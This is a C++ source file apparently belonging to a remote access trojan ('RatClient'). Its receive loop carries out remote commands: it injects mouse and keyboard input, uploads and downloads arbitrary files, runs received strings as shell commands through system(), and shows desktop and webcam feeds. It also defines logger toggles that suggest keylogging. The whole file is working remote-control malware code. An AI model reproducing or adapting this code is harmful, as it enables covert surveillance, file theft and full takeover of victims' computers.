// RatClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/NetworkHandlerClient.h"

#include <string>
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

NetworkHandlerClient NH;
string DesktopFeed = "Desktop Feed";
string CamFeed = "Cam Feed";

void CallBackFunc(int event, int x, int y, int flags, void* userdata)
{
    if (event == cv::EVENT_LBUTTONDOWN)
    {
        cout << "Left button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
        NH.SendDataT<int>(x);
        NH.SendDataT<int>(y);
    }
    else if (event == cv::EVENT_RBUTTONDOWN)
    {
        cout << "Right button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MBUTTONDOWN)
    {
        cout << "Middle button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MOUSEMOVE)
    {
        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;

    }
}

void rcv(NetworkHandlerClient NH) {
    DataType dt;
    cv::Mat image;
    INPUT in;
    
    NH.AddDataType("DesktopIMG",2);
    NH.AddDataType("MousePos", 3);
    NH.AddDataType("MouseDown",4);
    NH.AddDataType("MouseUp", 4);
    NH.AddDataType("KeyDown", 5);
    NH.AddDataType("KeyUp", 6);
    NH.AddDataType("CamIMG",7);
    NH.AddDataType("SendFILE",8);
    NH.AddDataType("RecvFILE", 8);
    NH.AddDataType("CMD",9);
    NH.AddDataType("EnableLogger", 10);
    NH.AddDataType("DisableLogger", 11);
    //NH.AddDataType("", 3);

    NH.SendTypeList();

    while (true) {
        NH.RecvDataType(dt);
        if (dt.Name == "MousePos") {
            in.type = INPUT_MOUSE;
            in.mi.dx = NH.RecvDataT<long>();
            in.mi.dy = NH.RecvDataT<long>();
            in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
            in.mi.mouseData = 0;
            in.mi.dwExtraInfo = 0;
            in.mi.time = 0;

            //keyboard stuff
            in.ki.dwExtraInfo = NULL;
            in.ki.dwFlags = NULL;
            in.ki.time = NULL;
            in.ki.wScan = NULL;
            in.ki.wVk = NULL;

            in.hi.uMsg = NULL;
            in.hi.wParamH = NULL;
            in.hi.wParamL = NULL;
            //keyboard stuff

            SendInput(1, &in, sizeof(INPUT));

        }
        else if (dt.Name == "MouseDown") {
            int clickType = NH.RecvDataT<int>();
            if (clickType == 1) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 2) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 3) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }


        }
        else if (dt.Name == "MouseUp") {
            int clickType = NH.RecvDataT<int>();
            if (clickType == 1) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 2) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 3) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
        }
        else if (dt.Name == "KeyDown") {
            // Set up a generic keyboard event.
            in.type = INPUT_KEYBOARD;
            in.ki.wScan = 0; // hardware scan code for key
            in.ki.time = 0;
            in.ki.dwExtraInfo = 0;

            // Press the "A" key
            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
            in.ki.dwFlags = 0; // 0 for key press
            SendInput(1, &in, sizeof(INPUT));

        }
        else if (dt.Name == "KeyUp") {
            // Set up a generic keyboard event.
            in.type = INPUT_KEYBOARD;
            in.ki.wScan = 0; // hardware scan code for key
            in.ki.time = 0;
            in.ki.dwExtraInfo = 0;

            // Press the "A" key
            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
            in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
            SendInput(1, &in, sizeof(INPUT));
        }
        else if (dt.Name == "SendFILE") {
            std::string path = NH.RecvDataT<std::string>();
            NH.RecvFile(path);
        }
        else if (dt.Name == "RecvFILE") {
        std::string path = NH.RecvDataT<std::string>();
        NH.SendFile(path, 10000);
        }
        else if (dt.Name == "CMD") {
            string command = NH.RecvDataT<std::string>();
            system(command.c_str());
        }
        else if (dt.Name == "DataTypeList") {
            NH.RecvTypeList();
        }
        else if (dt.Name == "DesktopIMG")
        {

            cv::resizeWindow(DesktopFeed, image.cols / 2, image.rows / 2);

            cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
            NH.RecvCVMat(&image);


            cv::imshow(DesktopFeed, image); // Show our image inside the created window.

        if (cv::waitKey(10) == 27)
        {
            cout << "Esc key is pressed by user. Stoppig the video" << endl;
            cv::destroyWindow(DesktopFeed);
        }
        }
        else if (dt.Name == "CamIMG") {
            NH.RecvCVMat(&image);


            cv::imshow(CamFeed, image); // Show our image inside the created window.

            if (cv::waitKey(10) == 27)
            {
                cout << "Esc key is pressed by user. Stoppig the video" << endl;
                cv::destroyWindow(CamFeed);
            }
        }
        
    }
}

int main()
{
    thread recvThread;
    if (NH.DefaultInitConnect()) {
        Sleep(1000);

        recvThread = thread(rcv, NH);

        cv::namedWindow(CamFeed, cv::WINDOW_KEEPRATIO); // Create a window
        NH.SendDataType("Invalid", 0);


        system("pause");
    }
    return 0;
}